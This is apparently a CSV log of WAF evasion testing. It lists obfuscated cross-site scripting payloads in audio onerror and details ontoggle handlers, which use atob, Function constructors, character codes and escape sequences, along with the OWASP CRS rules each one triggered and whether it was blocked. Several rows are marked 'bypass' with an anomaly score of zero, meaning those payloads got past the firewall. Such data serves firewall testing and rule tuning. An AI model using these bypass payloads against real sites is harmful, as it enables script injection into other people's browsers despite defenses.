index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
33,"<audio><source onerror=""((function(){var a=atob('YWxlcnQoMSk=');new Function(a)()})())""></audio>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o76,10v217,96t:urlDecode,t:replaceComments,t:compressWhitespace || o26,11v217,96 || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603309655.814546
34,"<audio><source onerror=""(function(){location='javascript:'+atob('YWxlcnQoMSk=')})()""></audio>",0,1,block,9,"934100,934100,941100,941120,941140,941160,941170,941210,949110","o25,11v217,93 || o25,11v217,93t:urlDecodeUni || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,35v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,41v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,12v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603309890.832558
36,"<audio><source onerror=""(function(){var a=atob('YWxlcnQoMSk=');(0,eval)(a)})()""></audio>",0,1,block,5,"934100,941100,941120,941160,949110","o25,11v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760330994.694221
37,"<audio><source onerror=""((function(){var a=atob('YWxlcnQoMSk=');globalThis['e\u0076a\u006c'](a);})())""></audio>",0,1,block,5,"934100,941100,941120,941160,949110","o26,11v217,111 || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603310010.595044
40,"<audio><source onerror=""((function(){var a=atob('YWxlcnQoMSk=');top['ev'+'al'](a);})())""></audio>",0,1,block,9,"932105,933210,934100,934100,941100,941120,941160,941370,949110","o63,4v217,97 || o67,20v217,97t:urlDecode,t:replaceComments,t:compressWhitespace || o26,11v217,97 || o26,11v217,97t:urlDecodeUni || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o64,14v217,97t:urlDecodeUni,t:compressWhitespace || ",40,17760331039.760760
41,"<details ontoggle=""(()=>{new Function('\u0061l'+'ert(1)')()})()"" open></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o52,11v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,80 || o25,13v217,80t:urlDecodeUni || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603310497.538443
43,"<details ontoggle=""(()=>{new Function(String.fromCharCode(97,108,101,114,116,40,49,41))()})()"" open></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,110 || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603310653.094591
44,"<details ontoggle=""(()=>{new Function('al'+'ert(1)')()})()"" OPEN></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o37,21v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,75 || o25,13v217,75t:urlDecodeUni || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603310721.832331
45,"<details ontoggle=""(()=>{new Function(['al'+'ert(1)'][0])()})()"" open></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o37,26v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,80 || o25,13v217,80t:urlDecodeUni || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760331082.173788
49,"<details ontoggle=""(()=>{new Function('al'+'ert\u00281\u0029')()})()"" open></details>",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,85 || o25,13v217,85t:urlDecodeUni || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603311253.556273
50,"<details ontoggle=""(()=>{new/**/Function('al'+'ert(1)')()})()"" open></details>",0,1,block,4,"933210,941100,941120,949110","o37,21v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603311336.849706
51,"<details ontoggle=""(()=>{new Function(atob('YWxlcnQoMSk='))()})()"" open></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603311466.656493
52,"<details ontoggle=""(()=>{new Function('al'.concat('ert(1)'))()})()"" open></details>",0,1,block,5,"933210,934100,941100,941120,949110","o37,29v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603311484.629558
56,"<details ontoggle=""(()=>{new Function('al'+'ert(1)').call()})()"" open></details>",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,80 || o25,13v217,80t:urlDecodeUni || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603311876.840916
59,"<details ontoggle=""(()=>{new Function(['ale'+'rt(1)'].join())()})()"" open></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o37,30v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,84 || o25,13v217,84t:urlDecodeUni || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603312198.160848
60,"<details ontoggle=""(()=>{new Function('al'+'ert'+'(1)')()})()""	open></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o37,24v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,78 || o25,13v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603312243.923082
66,<details ontoggle=(function(){}.constructor('\u0061\u006c\u0065\u0072\u0074(1)'))() open></details>,0,1,block,4,"934100,941100,941120,949110","o19,11v217,99 || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603312896.092920
67,<details ontoggle=(top['Function']('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029'))() open></details>,0,1,block,5,"933210,941100,941120,941370,949110","o18,71v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o19,15v217,105t:urlDecodeUni,t:compressWhitespace || ",20,177603312997.738946
74,<details ontoggle=(Function('\141\154\145\162\164\05041\051'))() open></details>,0,1,bypass,2,"941100,941120","v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17760331358.417211
75,<details ontoggle=(Function('\u0061\u006c&#x65;\u0072\u0074(1)'))() open></details>,0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603313633.416155
78,<details ontoggle=(top.Function('\u0061\u006c\u0065\u0072\u0074(1)'))() open></details>,0,1,bypass,2,"941100,941120","v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603313924.702019
79,<details ontoggle=(parent['Function']('\u0061\u006c\u0065\u0072\u0074(1)'))() open></details>,0,1,block,4,"933210,941100,941120,949110","o18,59v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603314012.497587
80,<details ontoggle=(Function('\u0061\u006c\u0065\u0072\u0074\u00281\u0029'))() open></details>,0,1,bypass,2,"941100,941120","v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603314130.012862
81,<details ontoggle=(function(){return(eval)(atob('YWxlcnQoMSk='))}()) open>,0,1,block,5,"933210,934100,941100,941120,949110","o18,50v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || o19,11v217,74 || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603314217.363657
83,<details ontoggle=(top.Function('al'+'ert(1)'))() open>,0,1,bypass,2,"941100,941120","v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603314456.448820
90,<details ontoggle=(function(){return(eval)('al'+'ert(1)')}()) open>,0,1,block,6,"933210,934100,934100,941100,941120,949110","o18,43v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || o19,11v217,67 || o19,11v217,67t:urlDecodeUni || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603315187.388222
91,<details ontoggle=(Function.prototype.constructor('al'+'ert(1)'))() open>,0,1,bypass,2,"941100,941120","v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603315251.284849
93,<details ontoggle=(self.Function('al'+'ert(1)'))() open>,0,1,bypass,2,"941100,941120","v216,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v216,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603315398.013202
94,<details ontoggle=(parent.Function('al'+'ert(1)'))() open>,0,1,bypass,2,"941100,941120","v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603315447.650918
95,<details ontoggle=(globalThis.Function('al'+'ert(1)'))() open>,0,1,bypass,2,"941100,941120","v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603315588.442496
96,"<details ontoggle=(Reflect.construct(Function,['al'+'ert(1)']))() open>",0,1,bypass,2,"941100,941120","v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603315684.453579
100,<details ontoggle=(function(){with(this)return(Function('al'+'ert(1)'))}())() open>,0,1,block,6,"933210,934100,934100,941100,941120,949110","o18,59v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o19,11v217,83 || o19,11v217,83t:urlDecodeUni || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603316037.678280
105,"<details ontoggle=(window['Function'](String['fromCharCode'](97,108,101,114,116,40,49,41)))() open>",0,1,block,5,"933210,941100,941120,941370,949110","o18,75v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o19,18v217,99t:urlDecodeUni,t:compressWhitespace || ",20,17760331655.755895
109,<details ontoggle=(self['Function']['constructor']('return\u0020alert')()('1'))() open>,0,1,block,5,"933210,941100,941120,941370,949110","o18,63v217,87t:urlDecode,t:replaceComments,t:compressWhitespace || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o19,16v217,87t:urlDecodeUni,t:compressWhitespace || ",20,177603316866.543229
114,<details ontoggle=(globalThis['Function']('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029'))() open>,0,1,block,4,"933210,941100,941120,949110","o18,78v217,102t:urlDecode,t:replaceComments,t:compressWhitespace || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603317415.398835
117,"<details ontoggle=(parent['Function'](String.fromCharCode(97)+String.fromCharCode(108,101,114,116,40,49,41)))() open>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o18,93v217,117t:urlDecode,t:replaceComments,t:compressWhitespace || o38,19v217,117 || o38,19v217,117t:urlDecodeUni || v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603317611.547104
121,"<details ontoggle=(Function(String.fromCharCode(97,108,101,114,116,40,49,41)))() open></details>",0,1,block,4,"934100,941100,941120,949110","o28,19v217,96 || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603318080.909200
